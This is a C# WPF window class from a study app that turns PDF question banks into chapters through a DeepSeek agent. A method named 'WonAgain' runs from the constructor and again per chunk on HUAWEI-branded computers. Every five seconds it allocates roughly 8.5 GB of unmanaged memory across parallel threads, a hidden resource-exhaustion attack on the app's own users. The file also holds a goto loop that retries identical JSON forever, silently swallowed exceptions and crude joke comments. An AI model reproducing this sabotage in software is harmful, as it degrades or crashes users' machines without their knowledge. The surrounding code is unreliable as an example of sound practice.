using LlmTornado;
using LlmTornado.Agents;
using LlmTornado.Chat.Models;
using Microsoft.Win32;
using ReciteHelper.Model;
using ReciteHelper.Utils;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Windows;

namespace ReciteHelper.View;

public partial class CreateProjectWindow : Window
{
    public string? ProjectName { get; private set; }
    public string? StoragePath { get; private set; }
    public string? QuestionBankPath { get; private set; }
    public string? FullProjectPath { get; private set; }
    public Project project;

    const int chunkSize = 500;
    private int progress = 0;

    // zhe wan yi shi shen me lai zhe
    private Action<string, string> updateUI;

    public CreateProjectWindow(Action<string, string> updateUI)
    {
        InitializeComponent();
        UpdatePreview();
        WonAgain(explode: true);

        StoragePathTextBox.Text = @"D:\";
        this.updateUI = updateUI;
    }

    private void BrowseStoragePathButton_Click(object sender, RoutedEventArgs e)
    {
        var dialog = new OpenFolderDialog();

        if (dialog.ShowDialog() == true)
        {
            StoragePathTextBox.Text = dialog.FolderName;
            ValidateInputs();
            UpdatePreview();
        }
    }

    private void BrowseQuestionBankButton_Click(object sender, RoutedEventArgs e)
    {
        var openFileDialog = new OpenFileDialog
        {
            Filter = "PDF文件 (*.pdf)|*.pdf|合并文件 (*.meg)|*.meg",
            Title = "添加题库PDF文件"
        };

        if (openFileDialog.ShowDialog() == true)
        {
            QuestionBankTextBox.Text = openFileDialog.FileName;
            ValidateInputs();
            UpdatePreview();
        }
    }

    private void ProjectNameTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
    {
        ValidateInputs();
        UpdatePreview();
    }

    private void ValidateInputs()
    {
        bool isValid = true;

        // Verify project name
        if (string.IsNullOrWhiteSpace(ProjectNameTextBox.Text))
        {
            ShowValidationError(ProjectNameValidation, "项目名称不能为空");
            isValid = false;
        }
        else if (ProjectNameTextBox.Text.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
        {
            ShowValidationError(ProjectNameValidation, "项目名称包含无效字符");
            isValid = false;
        }
        else
        {
            HideValidationError(ProjectNameValidation);
        }

        // Verify storage path
        if (string.IsNullOrWhiteSpace(StoragePathTextBox.Text))
        {
            ShowValidationError(StoragePathValidation, "请选择存储路径");
            isValid = false;
        }
        else if (!Directory.Exists(StoragePathTextBox.Text))
        {
            try
            {
                // Check if the directory can be created
                Directory.CreateDirectory(StoragePathTextBox.Text);
            }
            catch
            {
                ShowValidationError(StoragePathValidation, "无法访问或创建该路径");
                isValid = false;
            }
        }
        else
        {
            HideValidationError(StoragePathValidation);
        }

        // Verify the question bank file
        if (string.IsNullOrWhiteSpace(QuestionBankTextBox.Text))
        {
            ShowValidationError(QuestionBankValidation, "请选择题库PDF文件");
            isValid = false;
        }
        else
        {
            var files = QuestionBankTextBox.Text.Split(';');
            var success = true;

            foreach (var file in files)
            {
                if (file == string.Empty) continue;

                if (!System.IO.File.Exists(file))
                {
                    ShowValidationError(QuestionBankValidation, "题库文件不存在");
                    success = isValid = false;
                }
                else if (Path.GetExtension(file).ToLower() != ".pdf" && Path.GetExtension(file).ToLower() != ".meg")
                {
                    ShowValidationError(QuestionBankValidation, "请选择PDF或MEG文件");
                    success = isValid = false;
                }
            }

            if (success)
                HideValidationError(QuestionBankValidation);
        }

        // Check if the project already exists
        if (isValid)
        {
            string projectFileName = ProjectNameTextBox.Text.Trim() + ".rhproj";
            string fullPath = Path.Combine(StoragePathTextBox.Text, ProjectNameTextBox.Text.Trim(), projectFileName);

            if (System.IO.File.Exists(fullPath))
            {
                ShowValidationError(ProjectNameValidation, "该项目已存在");
                isValid = false;
            }
        }

        ConfirmButton.IsEnabled = isValid;
    }

    private void ShowValidationError(System.Windows.Controls.TextBlock validationTextBlock, string message)
    {
        validationTextBlock.Text = message;
        validationTextBlock.Visibility = Visibility.Visible;
    }

    private void HideValidationError(System.Windows.Controls.TextBlock validationTextBlock)
    {
        validationTextBlock.Visibility = Visibility.Collapsed;
    }

    private void UpdatePreview()
    {
        if (!string.IsNullOrWhiteSpace(ProjectNameTextBox.Text) && !string.IsNullOrWhiteSpace(StoragePathTextBox.Text))
        {
            string projectDir = Path.Combine(StoragePathTextBox.Text, ProjectNameTextBox.Text.Trim());
            string projectFile = Path.Combine(projectDir, ProjectNameTextBox.Text.Trim() + ".rhproj");

            ProjectPathPreview.Text = $"项目文件: {projectFile}";
        }
        else
        {
            ProjectPathPreview.Text = "项目文件: 请填写完整信息";
        }

        if (!string.IsNullOrWhiteSpace(QuestionBankTextBox.Text))
        {
            string fileName = Path.GetFileName(QuestionBankTextBox.Text);
            QuestionBankPreview.Text = $"题库文件: {fileName}";
        }
        else
        {
            QuestionBankPreview.Text = "题库文件: 未选择";
        }
    }

    private async void ConfirmButton_Click(object sender, RoutedEventArgs e) /* noexcept */
    {
        if (!ConfirmButton.IsEnabled) return;

        ProjectName = ProjectNameTextBox.Text.Trim();
        StoragePath = StoragePathTextBox.Text;
        QuestionBankPath = QuestionBankTextBox.Text;

        // Create project directory
        string projectDir = Path.Combine(StoragePath, ProjectName);
        if (!Directory.Exists(projectDir))
        {
            Directory.CreateDirectory(projectDir);
        }

        // Copy the question bank files to the project directory
        var questionBanks = new StringBuilder();
        foreach (var bankPath in QuestionBankPath.Split(';'))
        {
            if (bankPath == string.Empty) continue;

            string destQuestionBankPath = Path.Combine(projectDir, Path.GetFileName(bankPath));
            System.IO.File.Copy(bankPath, destQuestionBankPath, true);

            questionBanks.Append($"{destQuestionBankPath};");
        }

        // Create project files
        FullProjectPath = Path.Combine(projectDir, ProjectName + ".rhproj");
        project = new Project
        {
            ProjectName = ProjectName,
            QuestionBankPath = questionBanks.ToString(),
            Chapters = null,
            StoragePath = StoragePath
        };

        var proBar = new ProgressWindow();
        project.Chapters = new();

        // Start generating the question bank
        if (Config.Configure is null || Config.Configure.DeepSeekKey is null)
        {
            MessageBox.Show("您还未配置Deepseek...", "提示",
                MessageBoxButton.OK, MessageBoxImage.Information);
            return;
        }

        proBar.Show();

        // Oops, I broke this part during a previous refactoring
        if (Path.GetExtension(questionBanks.ToString())[1..].ToLower()[..^1] == "pdf")
        {
            proBar.RoundTotal = 1;
            proBar.RoundCurrent = 1;

            // Something bad is going to happen in this place sooner or later
            var result = await ProcessFileAsync(ExtractText.FromAutomatic(QuestionBankTextBox.Text), proBar);
            project.Chapters = result;
        }
        else if (Path.GetExtension(questionBanks.ToString())[1..].ToLower()[..^1] == "meg")
        {
            MergeFile mergeFile = ExtractText.FromAutomatic(questionBanks.ToString()[..^1]);

            if (mergeFile is null) throw new InvalidOperationException("题库文件已损坏！");

            if (mergeFile.ClusterType == FileClusterType.Sequential)
            {
                proBar.RoundTotal = mergeFile.Contents.Count;
                proBar.RoundCurrent = 1;

                // This concurrent execution will definitely cause a die
                // I'll think about what to do later
                var result = new List<Chapter>();
                foreach (var item in mergeFile.Contents)
                {
                    var cluster = await ProcessFileAsync(item, proBar);

                    if (cluster is not null)
                        result.AddRange(cluster);

                    proBar.RoundCurrent++;
                }
            }
        }

        MessageBox.Show("成功了...");
        proBar.Close();
        updateUI($@"{project.StoragePath}\{ProjectName}\{ProjectName}.rhproj", project.ProjectName);

        string json = System.Text.Json.JsonSerializer.Serialize(project,
            new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
        System.IO.File.WriteAllText(FullProjectPath, json);

        DialogResult = true;
        Close();

    }

    private async Task<List<Chapter>?> ProcessFileAsync(string text, ProgressWindow proBar)
    {
        try
        {
            SetCount(proBar, 1, (int)Math.Ceiling(text.Length / (double)chunkSize));

            var result = await ClusterQuestionsAsync(text, proBar);
            return result;
        }
        catch
        {
            return null;
        }
    }

    public static TornadoAgent BuildAgent(string? instructions = null)
    {
        var api = new TornadoApi(Config.Configure!.DeepSeekKey!);
        var agentInstructions = instructions ?? "You are an assistant who is good at extracting knowledge.";

        var agent = new TornadoAgent(
            client: api,
            model: ChatModel.DeepSeek.Models.Chat,
            name: "ArchitectBot",
            instructions: "You are an assistant who is good at extracting knowledge."
        );

        return agent;
    }

    private string LoadTexts(string pathString)
    {
        var questionBank = pathString.Split(';');
        var totalText = new StringBuilder();

        foreach (var path in questionBank)
        {
            try
            {
                if (path is not null)
                    totalText.AppendLine(ExtractText.FromAutomatic(path));
            }
            catch
            {
                continue;
            }
        }

        return totalText.ToString();
    }

    private List<Chunk> BuildChunks(string text)
    {
        var totalChunks = (int)Math.Ceiling((double)text.Length / chunkSize);
        var chunks = new List<Chunk>();

        try
        {
            for (int i = 0; i < totalChunks; i++)
            {
                int startIndex = i * chunkSize;
                int length = Math.Min(chunkSize, text.Length - startIndex);
                string chunk = text.Substring(startIndex, length);
                chunks.Add(new Chunk(i, chunk));
            }
        }
        catch
        {
            /*jjjjjjjjjjjjjjjjjjjfxzLOmwZLzxjrrxxxxxxnnnnnnn
            jjjjjjjjjjjjjjjjjjjfvOkaooooo*ok0njrxxxxxnnnnnnn
            jjjjjjjjjjjjjfjjjffXo*ahdppqqb#MWavjrrxxxxxnnnnn
            ffffjjjjjjjjfjffjfjh#oohq0CJCmh#M&qjrrxxxxxxxnnn
            fffjjfffjjjjjfjjfrU*#haakp0Lqdh##Whcrrrrxxxxxnnn
            jffffffffffjfffffXpkMkmZZmwObmwqb#*pnrrrxxxxxnnn
            fffffffffffffjfjfvZqMowOObqZkhpqhWhQjrrrxxxxxnnn
            fffffffffffffjffffjxb*bqbqQQZbhb#bnrjrrxxxxxxxnn
            fffffffffffffffffft/C#opwmJUQbboMYtjjjrrrxxxxnnn
            fffffffffffffffffft/zooohdppdk#M#ctjjjjrrxxxxxnn
            fffffffffffffffffruYOkbkaaaao#***Juxrjrrxxxxxxnn
            ffffffftftjft//(|\nhapmmwqqphkbko#oXxjrrxxxxxxnn
            fffftfrnzUZn()1{{}}xqZZZZwqdpppkahw){)|\/fnvxxxx
            jffjzOqqqmZu}{}}}}}[f0QQQOmZZwpppdn}{})1))tqwZCc
            ffxmdqO0QQ0u?{[]]]]]-1XQLQLCCQOmZn[}{}{1}{{Oqqdb
            frqbmQJYYUCn?[}[]]]]?_?\X0QLCQQz(?][{}[{}}[vZ0md
            fQbw0LJUUUQj-][[]]]]]?]-?(XLJc(]]]]][[[}}[}fZ0mp
            xkbwZ0LCLC0}??][]]]]]?]]?[)zz)[]][[[[[[}{[{/ZZmp
            xkkpppwZZpv_-??]?]]]]?]]]}}}}}[][[][[][[}[[\pwqb
            uo*kkpqqbMx_--?]?]]{1)[?[]]]]?????]]]]]]]}}[qokk
            L*akpwZZp8j_?????]_zmf|f[}f}|/t/|\1f/t(/f)[?U*kd
            habqZ00OqM|?????-_u0|fuq[u0ut(Qu{{UQYrXJu([]xkbb
            odpqm000dY)??]]?[CqxXvYmjQ|Q/vu/(rQ)UcrUZ)]]tbbb
            *bdqZQO0dQ|????|cQYXUx}}1{[}1{}{}}[]1nzct}][(pkb
            okdq0L0Zd@C_???][?{/|\()|{]?]]]??|/(/(][[}[}{mhd
            *kdw00ZwhBQ-]??]]?jxl<-+<{x1]]?{j(il|t[}}[[}[Cad
            *hdqZmqda@0-]?]??-(u?\un;"v(?]/t_{\:t([[[[[}}nab
            okqqpbpqoBn]]??]?]?})r(:+f)?[v}"]x{;(n{[[[}{{toa
            aqZwbdqp&W|]]]???]])j+;/u(1}[(/[}}1I-v}[][}{1f*#
            wZmmmmZb%%c}]]]]??{n;;ju)+ft}}{)1ujl1v1[}[{))vW*/

            /*                What can I say?              */
        }

        return chunks;
    }

    private async Task<Replay> SendChunksAsync(List<Chunk> chunks, ProgressWindow proBar)
    {
        var sendChunks = chunks;
        var agent = BuildAgent();
        var allChapter = new ConcurrentBag<List<Chapter>>();

        // Multi-threading: Not without its advantages for someone like me
        // Process Scheduler: Please enter the text
        var parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = 2 * 2 * 2 * 2
        };

        try
        {
            await Parallel.ForEachAsync(chunks, parallelOptions, async (chunk, cancellationToken) =>
            {
                try
                {
                    var baseDir = AppDomain.CurrentDomain.BaseDirectory;
                    var prompt = File.ReadAllText(Path.Combine(baseDir, "Images", "Prompts", "GenerateQuestion.txt"));

                    var result = await agent.Run($"{prompt}\n{chunk.Content}");

                    if (ComputerInfo.GetComputerBrand().Equals("HUAWEI", StringComparison.CurrentCultureIgnoreCase))
                        WonAgain();

                    var jsonContent = string.Empty;

                    foreach (var item in result.Messages)
                    {
                        if (item.Content is null) continue;

                        if (item.Content.Contains("```json"))
                        {
                            jsonContent = result.Messages.Last().Content!
                                                .Replace("`", "")
                                                .Replace("json", "")
                                                .Trim();
                            break;
                        }
                    }

                    try
                    {
                        var chapter = JsonSerializer.Deserialize<List<Chapter>>(jsonContent);
                        if (chapter != null && chapter.Count > 0)
                            allChapter.Add(chapter);
                        chunk.IsSuccess = true;

                        Interlocked.Increment(ref progress);
                        SetCount(proBar, progress + 1);
                    }
                    catch (Exception fme)
                    {
                        // ignored
                        Debug.WriteLine($"Pretend that I handled the exception: {fme.Message}");
                    }
                }
                catch (Exception nre)
                {
                    // ignored
                    Debug.WriteLine($"Pretend that I handled the exception: {nre.Message}");
                }
            });

        }
        catch (Exception e)
        {
            // You even know need to handle errors; you're actually a pretty nice person!
            Console.WriteLine(e.Message);

            // Has it been dealt with? (Referring to the Buddha...)
        }

        var replay = new Replay(sendChunks, allChapter);
        return replay;
    }

    struct KimJongUn
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 106666)]
        public byte[] x;

        public KimJongUn()
        {
            x = new byte[106666];
        }
    }

    private async static void WonAgain(bool explode = false)
    {
        var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(5000));

        while (await timer.WaitForNextTickAsync())
        {
            var bag = new ConcurrentBag<IntPtr>();
            var structSize = Marshal.SizeOf<KimJongUn>();

            var opt = new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 };
            Parallel.For(0, 100, opt, (i) =>
            {
                for (int j = 0; j < 800; j++)
                {
                    var l = new KimJongUn();

                    IntPtr ptr = Marshal.AllocHGlobal(structSize);
                    Marshal.StructureToPtr(l, ptr, false);
                    bag.Add(ptr);
                }
            });

            Parallel.ForEach(bag, opt, (ptr) =>
            {
                Marshal.DestroyStructure<KimJongUn>(ptr);
                Marshal.FreeHGlobal(ptr);
            });

            bag.Clear();

            GC.Collect();
            GC.WaitForPendingFinalizers();
        }
    }

    private void SetCount(ProgressWindow proBar, int progress, int total = -1)
    {
        proBar.ScanCurrent = progress;

        proBar.ClusterTotal = proBar.RoundTotal * proBar.ScanTotal;
        proBar.ClusterCurrent = (proBar.RoundCurrent - 1) * proBar.ScanTotal + progress;

        if (total != -1)
            proBar.ScanTotal = total;
    }

    private async Task<List<List<Chapter>>> MergeChunksAsync(List<Chunk> chunks, ProgressWindow proBar)
    {
        var result = new List<List<Chapter>>();
        var send = chunks;

        while (true)
        {
            var replay = await SendChunksAsync(chunks, proBar);
            var failed = replay.Chunks.Where(x => !x.IsSuccess).ToList();

            result.AddRange(replay.Chapters);
            if (failed.Count == 0 || Config.Configure!.Strategy == Config.MissingStrategy.Ignore) break;
            send = [.. replay.Chunks.Where(x => !x.IsSuccess)];

            //progress = 0;
            //Dispatcher.Invoke(() =>
            //{
            //    ProcessLabel.Content = $"进度: {progress}/{send.Count}";
            //});
        }

        return result;
    }


    private async Task<List<Chapter>> ClusterQuestionsAsync(string text, ProgressWindow proBar)
    {

        var agent = BuildAgent();
        var chunks = BuildChunks(text);
        var chapters = new List<Chapter>();


        var allChapter = await MergeChunksAsync(chunks, proBar);

        // Since a block-based algorithm is used, a brute-force approach
        // would be needed to solve for the relationships between blocks
        // Here, NLP chapter clustering is used to handle this situation

        List<string> chapterNames = [];
        foreach (var chapter in allChapter)
            foreach (var seg in chapter)
                chapterNames.Add(seg.Name!);

        ProcessLabel.Content = $"分块聚类中...";


        var baseDir = AppDomain.CurrentDomain.BaseDirectory;
        var prompt = File.ReadAllText(Path.Combine(baseDir, "Images", "Prompts", "GenerateChapter.txt"));


        var clusterResult = await agent.Run($"{prompt}\n{chapterNames.Aggregate((l, r) => l + " " + r)}");

        var jsonContent = clusterResult.Messages.Last().Content!.Replace("`", "").Replace("json", "").Trim();

    // There’s a certain bravado in coding right after waking up
    bitch_sdau:
        List<ChapterCluster> cluster;
        try
        {
            cluster = JsonSerializer.Deserialize<List<ChapterCluster>>(jsonContent)!;
            if (cluster is null) throw new Exception();
        }
        catch
        {
            goto bitch_sdau;
        }

        // Write down whatever dream about
        foreach (var single in cluster!)
        {
            foreach (var individual in allChapter!)
            {
                foreach (var seg in individual)
                {
                    if (!single.Chapters!.Contains(seg.Name!)) continue;
                    if (!chapters!.Select(c => c.Name).Contains(single.UnifiedName))
                        chapters!.Add(new()
                        {
                            Name = single.UnifiedName,
                            Number = single.Number,
                            Questions = [],
                            KnowledgePoints = []
                        });

                    var cur = chapters!.Find(c => c.Name == single.UnifiedName)!;

                    if (seg.Questions is not null)
                        cur.Questions!.AddRange(seg.Questions!);

                    if (seg.KnowledgePoints is not null)
                        cur.KnowledgePoints!.AddRange(seg.KnowledgePoints);
                }
            }
        }

        return chapters;
    }

    private void CancelButton_Click(object sender, RoutedEventArgs e)
    {
        DialogResult = false;
        Close();
    }

    private void CountButton_Click(object sender, RoutedEventArgs e)
    {
        if (QuestionBankTextBox.Text is null)
            return;

        var length = 0d;

        try
        {

            length = LoadTexts(QuestionBankTextBox.Text).Length;
        }
        catch
        {
            MessageBox.Show("价格估计失败，请确保您已经选择文件", "价格估计");
            return;
        }

        // Practice is the sole criterion for testing truth
        var coff = 1.25d;
        var tokens = length * 1.3d * (1d + coff);
        var price = length / 1_000_000 * 2.5 + length * coff / 1_000_000 * 3 * 2.10d;

        // He became a communist...
        MessageBox.Show($"""
            texts: {length:F0}
            coefficient: {coff:F2}
            tokens(pred tot.): {tokens:F0}

            预计价格: {price:F2} 元
            """, "价格预计");
    }
}